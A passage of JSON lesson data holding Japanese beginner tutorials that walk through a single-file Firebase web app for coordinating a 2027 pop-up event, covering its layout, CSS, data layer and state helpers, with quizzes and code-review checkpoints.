   "date": "2026-11-17",
   "level": 2,
   "series": "popup2027",
   "part": 1,
   "concepts": [
    "reading",
    "dom_ui",
    "database",
    "async"
   ],
   "lessons": [
    "00-basics/02-how-to-read-code",
    "20-javascript/06-dom-events",
    "20-javascript/07-promise-async",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "2027 年のポップアップに向けて、メンバーでタスク・予定・ログ・アイデア・お金を共有する、1 ファイルだけでできた Web アプリの全体像。",
   "body": "> 📚 このページは **popup2027 シリーズの 1 ページ目（全体像）** です。ファイルは `index.html` の 1 つだけですが、中を 7 つの部分に分けて、2 ページ目から順番に読んでいきます。\n\n## 📄 解説するコード（ファイルと中身の地図）\n\n```text\npopup2027/\n├── .nojekyll        GitHub Pages で公開するための目印（中身は空）\n└── index.html       アプリのすべて（406 行）\n    ├── 1〜93 行     HTML の骨組み と CSS（見た目）                     → 2 ページ目\n    └── <script>     JavaScript（動き）\n        ├── 96〜143 行   データ層：Firebase / お試しモード              → 3 ページ目\n        ├── 145〜163 行  状態（S）と便利な小道具                         → 4 ページ目\n        ├── 165〜249 行  描画：ホーム・タスク・予定・ログの画面          → 5 ページ目\n        ├── 251〜291 行  描画：アイデア（いいね）・お金（精算）の画面    → 6 ページ目\n        ├── 293〜360 行  モーダルとイベント（クリック・送信）            → 7 ページ目\n        └── 362〜403 行  写真の縮小 と リアルタイム更新                  → 8 ページ目\n```\n\n## 🧭 ひとことで言うと\n\n**HTML・CSS・JavaScript** で書かれた、**2027 年のポップアップ（期間限定のお店・イベント）をメンバーで準備するための共有アプリ** です。\nタスク・予定・活動ログ・アイデア・立て替えたお金を記録でき、**Firebase**（Google のクラウドのデータベース）につながっているので、誰かが書き込むと他のメンバーの画面にもすぐ反映されます。\n\n## 🗺️ 全体の流れ\n\n1. ブラウザで `index.html` を開く（GitHub Pages で公開されている想定）\n2. Firebase に接続し、データ（タスクなど 5 種類と設定）を **「見張る（購読する）」** 状態にする\n3. 初めての人には「あなたは誰？」と名前を選んでもらう（この端末に記憶）\n4. 画面下のタブ（ホーム・タスク・予定・ログ・アイデア・お金）で表示を切り替える\n5. フォームで追加・ボタンで変更すると、Firebase に書き込まれる\n6. Firebase から「データが変わった」と知らせが来ると、画面全体を描き直す（自分の変更も、他の人の変更も同じ流れ）\n\n## 🔍 ブロックごとの解説\n\n### 6 つの画面\n\n| タブ | できること |\n|---|---|\n| 🏠 ホーム | 本番までのカウントダウン、タスクの進み具合、自分のやること、次の予定、最近のログ |\n| ✅ タスク | やることの追加、担当者・締め切り、未着手 → 進行中 → 完了 の切り替え |\n| 📅 予定 | マイルストーン（節目の予定）を日付順に。過ぎた予定は色が変わる |\n| 📝 ログ | 「今日やったこと・決まったこと」の記録 |\n| 💡 アイデア | 思いつきや写真の投稿、♥（いいね）。いいねの多い順に並ぶ |\n| 💰 お金 | 立て替えた支出の記録と、1 人あたりの精算額の自動計算 |\n\n### 1 ファイルにすべて入れる作り\n\nfashion_news（Python）は役割ごとにファイルを分けていましたが、こちらは **HTML・CSS・JavaScript を 1 つのファイルに全部入れて** います。\n\n- 良い点：サーバーもビルドも要らず、ファイルを置くだけで公開できる\n- 悪い点：長くなると読みにくい。だからこのシリーズでは、コメント `// ---------- 描画 ----------` などの区切りごとに分けて読みます\n\n### データの置き場所は 2 通り\n\n- **Firebase モード**：クラウドのデータベースに保存。メンバー全員で共有できる（本番はこちら）\n- **お試しモード**：Firebase の設定が無いときは、この端末のブラウザ（localStorage）だけに保存\n\n画面を描く側は「どちらに保存されているか」を気にしなくて済むように作られています（3 ページ目）。\n\n### 「状態 → 画面」の一方通行\n\nこの作り方の中心にある考え方です。\n\n```text\nデータ（S）が変わる → render() で画面を全部描き直す\n```\n\nボタンを押しても画面を直接いじらず、**データを変える → 知らせが来る → 描き直す** の順に流れます。React などのフレームワークと同じ考え方を、自分の手で小さく実装しています。\n\n## 🐍 Python と比べると\n\n| popup2027 | Python で言うと |\n|---|---|\n| `index.html` 1 ファイル | `app.py` 1 ファイルに全部書いたスクリプト |\n| Firebase（クラウドのデータベース） | サーバー上のデータベース。Python なら `firebase_admin` ライブラリで同じデータを読める |\n| `S`（状態をまとめたオブジェクト） | 状態をまとめた辞書 `S = {\"tab\": \"home\", ...}` |\n| `VIEWS.tasks()` が HTML の文字列を返す | 関数が f-string で文字列を組み立てて返すのと同じ |\n\n## 🔑 キーワード\n\n- **Firebase / Firestore**：Google のクラウドサービスと、その中のデータベース\n- **リアルタイム同期**：誰かがデータを変えると、他の人の画面にもすぐ反映されること\n- **購読（subscribe）**：データを「見張って」、変わったら知らせてもらうこと\n- **localStorage**：ブラウザの中に小さなデータを保存しておける場所\n- **シングルページアプリ（SPA）**：1 つのページの中で画面を切り替えるアプリ\n- **GitHub Pages**：GitHub のリポジトリをそのまま Web サイトとして公開する仕組み\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ サーバー不要・ファイル 1 つで動き、データはリアルタイムで共有される。小さなチーム用としてよくできている\n- ✅ ユーザーが入力した文字は `esc()` で無害化してから画面に出している\n- ✅ Firebase が無くても「お試しモード」で動く\n- ⚠️ **ログインの仕組みが無い**。「あなたは誰？」は名前を選ぶだけで、本人確認ではない。リポジトリも公開されているので、**データを守れるかは Firestore の「セキュリティルール」次第**（ルールがゆるいと、URL を知った誰でも読み書き・削除できる）。Firebase のコンソールでルールを確認したい\n- ⚠️ メンバーは設定画面で名前を変えられるが、**人数（3 人）は増やせない**作りになっている\n- ⚠️ 写真をデータベースの中に文字列として保存しているので、写真が多いと読み込みが重くなる（8 ページ目）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「これは 2027 年のポップアップに向けて、メンバーで準備を共有するための Web アプリです。HTML 1 ファイルだけでできていて、タスク・予定・ログ・アイデア・お金の 5 種類のデータを Firebase のデータベースに保存しています。\nデータを購読しているので、誰かが書き込むと全員の画面がすぐ更新されます。お金のタブでは立て替えを記録すると、誰がいくら払えばいいかを自動で計算してくれます。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "メンバーの誰かがタスクを追加すると、他のメンバーの画面はどうなる？",
      "choices": [
       "再読み込みするまで変わらない",
       "Firebase から知らせが来て、自動で描き直される",
       "次の日に反映される"
      ],
      "answer": 1,
      "explain": "データを購読（onSnapshot）しているので、変更がすぐに届きます。"
     },
     {
      "question": "Firebase の設定が無いときはどうなる？",
      "choices": [
       "お試しモードになり、この端末のブラウザだけに保存される",
       "アプリが動かない",
       "GitHub にデータが保存される"
      ],
      "answer": 0,
      "explain": "画面上部に「お試しモード」と表示されます。"
     },
     {
      "question": "このアプリでデータを守る上で特に大事なのは？",
      "choices": [
       "「あなたは誰？」で名前を選ぶこと",
       "Firebase（Firestore）のセキュリティルールの設定",
       "ファイルを 1 つにまとめること"
      ],
      "answer": 1,
      "explain": "名前の選択は本人確認ではないため、誰が読み書きできるかはデータベース側のルールで決まります。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-01-overview"
  },
  {
   "title": "HTML の骨組みと CSS ― 画面の「入れ物」と見た目",
   "language": "HTML/CSS",
   "date": "2026-11-17",
   "level": 1,
   "series": "popup2027",
   "part": 2,
   "concepts": [
    "dom_ui"
   ],
   "lessons": [
    "20-javascript/06-dom-events",
    "00-basics/01-what-is-a-program"
   ],
   "summary": "アプリの入れ物になる HTML（4 つの空の箱）と、色をまとめて管理する CSS 変数・ダークモード対応。",
   "body": "## 📄 解説するコード（1〜93 行目・抜粋）\n\n```html\n<!doctype html>\n<html lang=\"ja\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1,viewport-fit=cover\">\n<title>POP UP 2027</title>\n<link href=\"https://fonts.googleapis.com/css2?family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap\" rel=\"stylesheet\">\n<style>\n:root{\n  --bg:#f6f3ee; --card:#ffffff; --ink:#1f1d1a; --sub:#77716a; --line:#e6e0d7;\n  --accent:#e2553f; --accent-soft:#fbe4df; --ok:#2f8f5b; --ok-soft:#dff1e6; --warn:#c98a12; --warn-soft:#faefd7;\n  --radius:14px;\n}\n@media (prefers-color-scheme: dark){\n  :root{ --bg:#171614; --card:#22201d; --ink:#f2eee8; /* …略… */ }\n}\nbody{background:var(--bg);color:var(--ink);font-family:\"Zen Kaku Gothic New\",system-ui,sans-serif;padding-bottom:84px}\n.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:16px;margin-bottom:12px}\n.s-todo{background:var(--line);color:var(--sub)}\n.s-doing{background:var(--warn-soft);color:var(--warn)}\n.s-done{background:var(--ok-soft);color:var(--ok)}\nnav{position:fixed;left:0;right:0;bottom:0;background:var(--card);border-top:1px solid var(--line);display:flex;justify-content:center;padding-bottom:env(safe-area-inset-bottom)}\n.modal{position:fixed;inset:0;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;padding:16px;z-index:10}\n/* …ほか約 60 行… */\n</style>\n</head>\n<body>\n<header>\n  <h1 id=\"title\">POP UP 2027</h1>\n  <button class=\"me\" id=\"meBtn\">—</button>\n</header>\n<main id=\"main\"></main>\n<nav><div class=\"in\" id=\"nav\"></div></nav>\n<div id=\"modal\"></div>\n\n<script type=\"module\">\n  // ここから JavaScript（3 ページ目以降）\n</script>\n</body>\n</html>\n```\n\n## 🧭 ひとことで言うと\n\n**HTML** でアプリの **入れ物（空の箱）** を用意し、**CSS** で色・形・配置を決めている部分です。中身（タスクの一覧など）は後から JavaScript が箱に流し込みます。\n\n## 🗺️ 全体の流れ\n\n1. `<head>`：文字コード・スマホ対応・タイトル・フォント・CSS を読み込む\n2. `<body>`：4 つの箱（ヘッダー・メイン・下のタブ・モーダル）を置く。**ほとんど空っぽ**\n3. `<script type=\"module\">`：JavaScript が動き出し、空の箱に HTML を入れていく\n\n## 🔍 ブロックごとの解説\n\n### `<head>`：ページの設定\n\n| 行 | 意味 |\n|---|---|\n| `<meta charset=\"utf-8\">` | 日本語が文字化けしないための文字コード指定 |\n| `<meta name=\"viewport\" ...>` | スマホで見たときに、画面の幅に合わせて表示する |\n| `<link ... fonts.googleapis.com ...>` | Google Fonts から「Zen Kaku Gothic New」という日本語フォントを読み込む |\n| `<style> … </style>` | CSS（見た目のルール）をこのファイルの中に直接書いている |\n\n### `<body>`：4 つの空の箱\n\n```html\n<main id=\"main\"></main>\n<nav><div class=\"in\" id=\"nav\"></div></nav>\n<div id=\"modal\"></div>\n```\n\n`id=\"main\"` などの **名札** が付いた空の箱です。JavaScript は `document.getElementById(\"main\")` でこの箱を探し、中身を入れます（JavaScript コースの「DOM とイベント」）。\n\n| 箱 | 何が入る？ |\n|---|---|\n| `header` の `#title` / `#meBtn` | アプリのタイトルと「👤 自分の名前」ボタン |\n| `#main` | 今のタブの画面（ホーム、タスク一覧など） |\n| `#nav` | 画面下の 6 つのタブ |\n| `#modal` | 「あなたは誰？」や設定などの、上に重なる小窓 |\n\n### CSS 変数：色をまとめて管理\n\n```css\n:root{ --bg:#f6f3ee; --accent:#e2553f; ... }\nbody{ background:var(--bg); }\n```\n\n`--bg` のように `--` で始まる名前は **CSS 変数**（色などに付けた名前）です。`var(--bg)` で使います。\n色を 1 か所にまとめておくと、**変数の値を変えるだけでアプリ全体の色が変わる** ので便利です。\n\n### ダークモード対応\n\n```css\n@media (prefers-color-scheme: dark){\n  :root{ --bg:#171614; --card:#22201d; ... }\n}\n```\n\n「端末がダークモードなら、変数の値をこちらにする」という意味です。CSS 変数で作っているので、**変数を入れ替えるだけで** 画面全体が暗い配色になります。\n\n### タスクの状態ごとの色\n\n```css\n.s-todo{ ... }  .s-doing{ ... }  .s-done{ ... }\n```\n\nJavaScript がタスクのボタンに `class=\"chip s-doing\"` のようにクラスを付けると、その状態の色になります。**状態の名前と CSS のクラス名をそろえる** よくある工夫です。\n\n### 画面に固定された部品\n\n- `nav{position:fixed; bottom:0}`：タブを **画面の下に固定**。スクロールしても動かない\n- `body{padding-bottom:84px}`：固定したタブの裏に最後の項目が隠れないよう、下に余白を空ける\n- `env(safe-area-inset-bottom)`：iPhone の画面下のバー（ホームバー）にかからないようにする\n- `.modal{position:fixed; inset:0; background:rgba(0,0,0,.45)}`：画面全体を半透明の黒で覆い、真ん中に小窓を出す\n\n## 🐍 Python と比べると\n\n| HTML/CSS | Python で言うと |\n|---|---|\n| `id=\"main\"` の空の箱 | 後から値を入れる変数 `main = \"\"` |\n| CSS 変数 `--accent` | 定数 `ACCENT = \"#e2553f\"` を 1 か所に定義して使い回す |\n| `@media (prefers-color-scheme: dark)` | `if dark_mode: ACCENT = \"#ff7a63\"` |\n\n## 🔑 キーワード\n\n- **HTML**：ページの骨組み（何がどこにあるか）を書く言語\n- **CSS**：見た目（色・大きさ・配置）を書く言語\n- **id / class**：要素に付ける名札。id は 1 つだけ、class は何個にも付けられる\n- **CSS 変数**：`--名前` で値に名前を付け、`var(--名前)` で使う仕組み\n- **メディアクエリ（@media）**：画面の条件（ダークモード・画面幅など）によって CSS を切り替える仕組み\n- **position: fixed**：画面の決まった位置に固定する指定\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 色を CSS 変数にまとめていて、ダークモードにも対応している\n- ✅ スマホ（iPhone のホームバー）まで考えた配置\n- ⚠️ CSS を 1 行に詰めて書いているので読みにくい。ブラウザの開発者ツール（F12）で要素を選ぶと、どの CSS が効いているか見やすく表示される\n- ⚠️ フォントを Google Fonts から読み込むので、オフラインでは別のフォントで表示される（動作には影響なし）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「HTML の部分はほとんど空の箱で、ヘッダー・メイン・下のタブ・モーダルの 4 つに id を付けて置いているだけです。中身は JavaScript が後から入れます。\nCSS は色を CSS 変数にまとめていて、ダークモードのときは変数の値を入れ替えるだけで配色が変わるようになっています。タブは画面の下に固定されています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`<main id=\"main\"></main>` に最初から入っているものは？",
      "choices": [
       "何も入っていない（JavaScript が後から入れる）",
       "タスクの一覧",
       "ホーム画面"
      ],
      "answer": 0,
      "explain": "HTML は入れ物だけを用意し、中身は render() が入れます。"
     },
     {
      "question": "`color: var(--accent)` の意味は？",
      "choices": [
       "「--accent」という文字を表示する",
       "CSS 変数 --accent に入っている色を使う",
       "アクセント記号を付ける"
      ],
      "answer": 1,
      "explain": ":root で定義した色の値が使われます。"
     },
     {
      "question": "ダークモードの配色が切り替わる仕組みは？",
      "choices": [
       "JavaScript が全部の色を書き換えている",
       "@media で、ダークモードのときだけ CSS 変数の値を入れ替えている",
       "画像を入れ替えている"
      ],
      "answer": 1,
      "explain": "変数を使っているので、値を変えるだけで全体の色が変わります。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-02-html-css"
  },
  {
   "title": "データ層 ― Firebase とお試しモードを同じ使い方にする「窓口」",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 3,
   "series": "popup2027",
   "part": 3,
   "concepts": [
    "database",
    "async",
    "modules",
    "higher_order",
    "security"
   ],
   "lessons": [
    "20-javascript/07-promise-async",
    "20-javascript/08-modules-npm",
    "20-javascript/03-arrays-objects",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "Firebase（クラウド）と localStorage（端末）のどちらに保存しても、同じ 7 つの命令で使えるようにした「store」。",
   "body": "## 📄 解説するコード（96〜143 行目）\n\n```javascript\nconst FIREBASE_CONFIG = {\n  apiKey: \"***\",\n  authDomain: \"popup-2027.firebaseapp.com\",\n  projectId: \"popup-2027\",\n  storageBucket: \"popup-2027.firebasestorage.app\",\n  messagingSenderId: \"***\",\n  appId: \"***\",\n};\n\nconst DEFAULT_SETTINGS = { title: \"POP UP 2027\", date: \"2027-09-01\", members: [\"メンバーA\", \"メンバーB\", \"メンバーC\"] };\nconst COLS = [\"tasks\", \"milestones\", \"logs\", \"ideas\", \"expenses\"];\n\n// ---------- データ層 ----------\nlet store;\nif (FIREBASE_CONFIG) {\n  const { initializeApp } = await import(\"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js\");\n  const fs = await import(\"https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js\");\n  const db = fs.getFirestore(initializeApp(FIREBASE_CONFIG));\n  const onErr = e => { console.error(e); S.error = \"データベースに接続できません（\" + (e.code || e.message) + \"）。Firestore の作成とルールを確認してください。\"; render(); };\n  store = {\n    live: true,\n    sub(col, cb) { return fs.onSnapshot(fs.collection(db, col), s => cb(s.docs.map(d => ({ id: d.id, ...d.data() }))), onErr); },\n    subSettings(cb) { return fs.onSnapshot(fs.doc(db, \"meta\", \"settings\"), s => cb(s.exists() ? s.data() : null), onErr); },\n    add(col, d) { return fs.addDoc(fs.collection(db, col), { ...d, createdAt: Date.now() }); },\n    update(col, id, d) { return fs.updateDoc(fs.doc(db, col, id), d); },\n    remove(col, id) { return fs.deleteDoc(fs.doc(db, col, id)); },\n    saveSettings(d) { return fs.setDoc(fs.doc(db, \"meta\", \"settings\"), d); },\n  };\n} else {\n  const listeners = {};\n  const read = k => { try { return JSON.parse(localStorage.getItem(\"pu:\" + k)) } catch { return null } };\n  const write = (k, v) => { try { localStorage.setItem(\"pu:\" + k, JSON.stringify(v)) } catch {} ; (listeners[k] || []).forEach(f => f(v)); };\n  window.addEventListener(\"storage\", e => { if (e.key?.startsWith(\"pu:\")) { const k = e.key.slice(3); (listeners[k] || []).forEach(f => f(read(k))); } });\n  const on = (k, f) => { (listeners[k] ||= []).push(f); f(read(k)); };\n  store = {\n    live: false,\n    sub(col, cb) { on(col, v => cb(v || [])); },\n    subSettings(cb) { on(\"settings\", cb); },\n    add(col, d) { write(col, [...(read(col) || []), { ...d, id: crypto.randomUUID?.() || String(Math.random()), createdAt: Date.now() }]); },\n    update(col, id, d) { write(col, (read(col) || []).map(x => x.id === id ? { ...x, ...d } : x)); },\n    remove(col, id) { write(col, (read(col) || []).filter(x => x.id !== id)); },\n    saveSettings(d) { write(\"settings\", d); },\n  };\n}\n```\n\n（Firebase の設定値の一部は `***` に伏せています）\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**データを保存・読み込みする窓口（`store`）** を作る部分です。Firebase（クラウド）を使う版と、localStorage（この端末だけ）を使う版の 2 種類を用意し、**どちらでも同じ名前の命令で使える** ようにしています。このシリーズで一番大事で、少しむずかしい部分です。\n\n## 🗺️ 全体の流れ\n\n1. `FIREBASE_CONFIG` があれば、Firebase のライブラリをネットから読み込み、データベースにつなぐ\n2. 無ければ、ブラウザの localStorage を使う「お試しモード」の窓口を作る\n3. どちらの場合も、`store` に同じ 7 つの命令（`sub`・`subSettings`・`add`・`update`・`remove`・`saveSettings`・`live`）をそろえる\n4. 以降のコードは `store.add(\"tasks\", {...})` のように書くだけで、保存先を気にしない\n\n## 🔍 ブロックごとの解説\n\n### 窓口の命令の一覧\n\n| 命令 | 意味 | 例 |\n|---|---|---|\n| `sub(col, cb)` | そのデータを **見張り**、変わるたびに `cb` を呼んでもらう | タスク一覧が変わったら描き直す |\n| `subSettings(cb)` | 設定（タイトル・日付・メンバー名）を見張る | |\n| `add(col, d)` | 1 件追加 | タスクを追加 |\n| `update(col, id, d)` | 1 件の一部を書き換え | 状態を「完了」に |\n| `remove(col, id)` | 1 件削除 | |\n| `saveSettings(d)` | 設定を保存 | |\n| `live` | Firebase につながっているか（true / false） | 「お試しモード」の表示に使う |\n\n`col` は **コレクション**（データの種類ごとの入れ物）の名前で、`COLS` の 5 つ（tasks・milestones・logs・ideas・expenses）のどれかです。\n\n### Firebase 版：ライブラリを後から読み込む\n\n```javascript\nconst fs = await import(\"https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js\");\n```\n\n`import(...)` を **関数のように** 使うと、プログラムの途中でライブラリを読み込めます（動的インポート）。結果は Promise なので `await` で待ちます。\n普通は `await` は `async` 関数の中でしか使えませんが、`<script type=\"module\">` の一番外側では例外的に使えます（トップレベル await）。\n\n### onSnapshot：データを見張る\n\n```javascript\nsub(col, cb) { return fs.onSnapshot(fs.collection(db, col), s => cb(s.docs.map(d => ({ id: d.id, ...d.data() }))), onErr); }\n```\n\n`onSnapshot` は **「このデータが変わったら、毎回この関数を呼んで」と頼む** Firestore の機能です。自分の変更でも、他のメンバーの変更でも呼ばれます。これがリアルタイム同期の正体です。\n\n受け取ったデータ `s.docs` は扱いにくい形なので、`map` で `{ id: \"abc\", title: \"会場を探す\", ... }` という普通のオブジェクトの配列に変換して `cb` に渡しています。`...d.data()` はスプレッド構文で、中身を展開して `id` と合体させています。\n\n### お試し版：localStorage と「聞き手（listeners）」\n\n```javascript\nconst listeners = {};\nconst write = (k, v) => { localStorage.setItem(\"pu:\" + k, JSON.stringify(v)); (listeners[k] || []).forEach(f => f(v)); };\nconst on = (k, f) => { (listeners[k] ||= []).push(f); f(read(k)); };\n```\n\nlocalStorage には「変わったら知らせる」機能が無いので、**自分で作っています**。\n\n- `listeners`：`{ tasks: [関数, ...], ideas: [...] }` のように、データの種類ごとに「知らせてほしい関数」の一覧を持つ\n- `on`：関数を一覧に登録し、**すぐに一度** 今のデータで呼ぶ\n- `write`：保存したあと、登録された関数を全部呼ぶ（＝変わったことを知らせる）\n- `window.addEventListener(\"storage\", ...)`：**同じブラウザの別のタブ** で変更されたときも知らせる\n\nFirebase の `onSnapshot` と同じ動きを、小さく真似しているわけです。\n\n### 追加・更新・削除は「配列を作り直して保存」\n\n```javascript\nupdate(col, id, d) { write(col, (read(col) || []).map(x => x.id === id ? { ...x, ...d } : x)); }\nremove(col, id) { write(col, (read(col) || []).filter(x => x.id !== id)); }\n```\n\n- `update`：`map` で全件を見て、id が一致したものだけ `{ ...x, ...d }`（元の内容に変更を上書き）にする\n- `remove`：`filter` で、id が一致しないものだけ残す＝その 1 件を消す\n- `crypto.randomUUID?.()`：ランダムな ID を作る。`?.` は「この機能があれば呼ぶ」。無い古いブラウザでは `Math.random()` で代用\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `store = { add(col, d) {...}, ... }` | 同じメソッドを持つ 2 つのクラス `FirebaseStore` と `LocalStore` を作り、どちらかを `store` に入れる |\n| `await import(\"...\")` | `importlib.import_module(...)` で途中から読み込む |\n| `list.map(x => x.id === id ? {...x, ...d} : x)` | `[{**x, **d} if x[\"id\"] == id else x for x in lst]` |\n| `list.filter(x => x.id !== id)` | `[x for x in lst if x[\"id\"] != id]` |\n| `JSON.stringify` / `JSON.parse` | `json.dumps` / `json.loads` |\n\n**同じ使い方（インターフェース）で中身だけ取り替えられる** 設計は、fashion_news で「notion.py だけ取り替えれば LINE にも送れる」と話したのと同じ考え方です。\n\n## 🔑 キーワード\n\n- **データ層**：データの保存・読み込みだけを担当する部分\n- **Firestore**：Firebase のデータベース。コレクション（種類）とドキュメント（1 件）でデータを持つ\n- **onSnapshot**：データの変化を見張り、変わるたびに知らせてくれる Firestore の機能\n- **動的インポート**：`import()` で、プログラムの途中でライブラリを読み込むこと\n- **localStorage**：ブラウザにデータを保存する場所（文字列のみ。だから JSON に変換する）\n- **リスナー（listener）**：「何か起きたら呼んでほしい」と登録しておく関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 保存先の違いを `store` の中に閉じ込めていて、画面側のコードがすっきりしている\n- ✅ 接続に失敗したら、画面上部に原因のヒント付きで表示する\n- ✅ localStorage が使えない環境でも止まらないよう `try / catch` で守っている\n- ⚠️ `apiKey` などの Firebase の設定は、**Web アプリでは公開される前提の値** で、パスワードではない（ブラウザに届く時点で誰でも見られる）。その代わり、**Firestore のセキュリティルール** で「誰が読み書きできるか」を決める必要がある。このアプリにはログインが無いので、ルールの設定がとても重要\n- ⚠️ `if (FIREBASE_CONFIG)` は設定が書かれている今は常に Firebase モード。お試しモードにするには `const FIREBASE_CONFIG = null;` にする\n- ⚠️ お試しモードの `update` や `remove` は、毎回全件を読み直して書き直すので、データが多いと遅くなる（お試し用なので問題ない）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「データ層は、保存先が Firebase でも localStorage でも、同じ add・update・remove・sub の命令で使えるようにした窓口です。\nFirebase 版はライブラリを動的に読み込んで、onSnapshot でデータを見張り、変わるたびに画面側に知らせます。\nお試し版は localStorage には通知機能が無いので、知らせてほしい関数のリストを自分で持って、保存のたびに呼ぶことで同じ動きを再現しています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`store.add(\"tasks\", {...})` と書いたとき、保存先はどう決まる？",
      "choices": [
       "呼び出すたびに選ぶ",
       "最初に FIREBASE_CONFIG があるかで決まった store の中身による",
       "必ず両方に保存される"
      ],
      "answer": 1,
      "explain": "画面側は保存先を気にせず、同じ命令を呼ぶだけです。"
     },
     {
      "question": "`onSnapshot` の役割は？",
      "choices": [
       "データが変わるたびに、指定した関数を呼んでくれる",
       "データを一度だけ読み込む",
       "データを削除する"
      ],
      "answer": 0,
      "explain": "自分の変更でも他の人の変更でも呼ばれるので、リアルタイムに画面が更新されます。"
     },
     {
      "question": "`list.filter(x => x.id !== id)` は何をしている？",
      "choices": [
       "id が一致するものだけ残す",
       "id が一致する 1 件を取り除いた新しい配列を作る",
       "全件を削除する"
      ],
      "answer": 1,
      "explain": "一致「しない」ものだけを残すので、結果としてその 1 件が消えます。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-03-data-layer"
  },
  {
   "title": "状態（S）と小道具 ― アプリの「今」をまとめた箱と便利な関数",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 2,
   "series": "popup2027",
   "part": 4,
   "concepts": [
    "variables",
    "functions",
    "strings",
    "security",
    "collections"
   ],
   "lessons": [
    "20-javascript/01-js-basics",
    "20-javascript/04-functions-arrow",
    "20-javascript/03-arrays-objects",
    "20-javascript/06-dom-events"
   ],
   "summary": "アプリの今の状態をまとめたオブジェクト S と、無害化・日付・金額の表示などに使う小さな関数たち。",
   "body": "## 📄 解説するコード（145〜163 行目）\n\n```javascript\n// ---------- 状態 ----------\nconst S = { settings: DEFAULT_SETTINGS, tab: \"home\", filter: \"all\" };\nCOLS.forEach(c => S[c] = []);\nconst lsGet = k => { try { return localStorage.getItem(k) } catch { return null } };\nconst lsSet = (k, v) => { try { localStorage.setItem(k, v) } catch {} };\nS.me = lsGet(\"pu-me\");\nS.tab = lsGet(\"pu-tab\") || \"home\";\n\nconst esc = s => String(s ?? \"\").replace(/[&<>\"']/g, c => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" }[c]));\nconst today = () => { const d = new Date(); return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, \"0\")}-${String(d.getDate()).padStart(2, \"0\")}`; };\nconst fmtDate = s => s ? s.replace(/^(\\d{4})-(\\d{2})-(\\d{2})$/, (_, y, m, d) => `${y}/${+m}/${+d}`) : \"\";\nconst yen = n => \"¥\" + Math.round(n).toLocaleString(\"ja-JP\");\nconst byNew = (a, b) => (b.createdAt || 0) - (a.createdAt || 0);\nconst memberOpts = (sel, withNone) => (withNone ? `<option value=\"\">担当なし</option>` : \"\") + S.settings.members.map(m => `<option ${m === sel ? \"selected\" : \"\"}>${esc(m)}</option>`).join(\"\");\n\nconst TABS = [\n  [\"home\", \"🏠\", \"ホーム\"], [\"tasks\", \"✅\", \"タスク\"], [\"milestones\", \"📅\", \"予定\"],\n  [\"logs\", \"📝\", \"ログ\"], [\"ideas\", \"💡\", \"アイデア\"], [\"expenses\", \"💰\", \"お金\"],\n];\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**アプリの「今」を全部まとめた箱 `S`（State ＝状態）** と、あちこちで使う **小さな便利関数** の定義です。どれも 1 行関数（アロー関数）なので、1 つずつ分解して読めば怖くありません。\n\n## 🗺️ 全体の流れ\n\n1. `S` を作る：設定・今のタブ・絞り込みと、5 種類のデータ用の空の配列\n2. この端末に覚えてある「自分の名前」と「最後に開いていたタブ」を localStorage から読む\n3. 画面を作るときに使う便利関数（無害化・日付・金額・並べ替え・選択肢）を用意する\n4. 下のタブの一覧 `TABS` を定義する\n\n## 🔍 ブロックごとの解説\n\n### S：アプリの状態を 1 か所に\n\n```javascript\nconst S = { settings: DEFAULT_SETTINGS, tab: \"home\", filter: \"all\" };\nCOLS.forEach(c => S[c] = []);\n```\n\n最終的に `S` はこんな形になります。\n\n```javascript\n{\n  settings: { title: \"POP UP 2027\", date: \"2027-09-01\", members: [...] },\n  tab: \"home\",        // 今開いているタブ\n  filter: \"all\",      // タスクの絞り込み（全員 / メンバー名）\n  me: \"メンバーA\",     // 自分の名前\n  tasks: [], milestones: [], logs: [], ideas: [], expenses: [],  // データ\n  // 後から error・ideaPhoto・ideaDraft・busy なども入る\n}\n```\n\n**画面は S の中身だけを見て描かれます**。「画面を変えたいときは S を変えて render() を呼ぶ」のがこのアプリのルールです。\n`S[c] = []` の `[c]` は、変数 `c` の中身（\"tasks\" など）をキー名として使う書き方です。\n\n### lsGet / lsSet：失敗しても止まらない保存\n\nブラウザのプライベートモードなどでは localStorage が使えずエラーになることがあるので、`try / catch` で包んで「失敗したら何もしない」ようにしています。\n\n### esc：画面に出す前の無害化（とても大事）\n\n```javascript\nconst esc = s => String(s ?? \"\").replace(/[&<>\"']/g, c => ({ \"&\": \"&amp;\", ... }[c]));\n```\n\n`<` や `\"` などの記号を `&lt;` のような **ただの文字として表示される形** に置き換えます。\nこれをしないと、誰かがタスク名に `<img src=x onerror=...>` のような文字を入れたとき、**他のメンバーの画面でそのプログラムが動いてしまう**（XSS 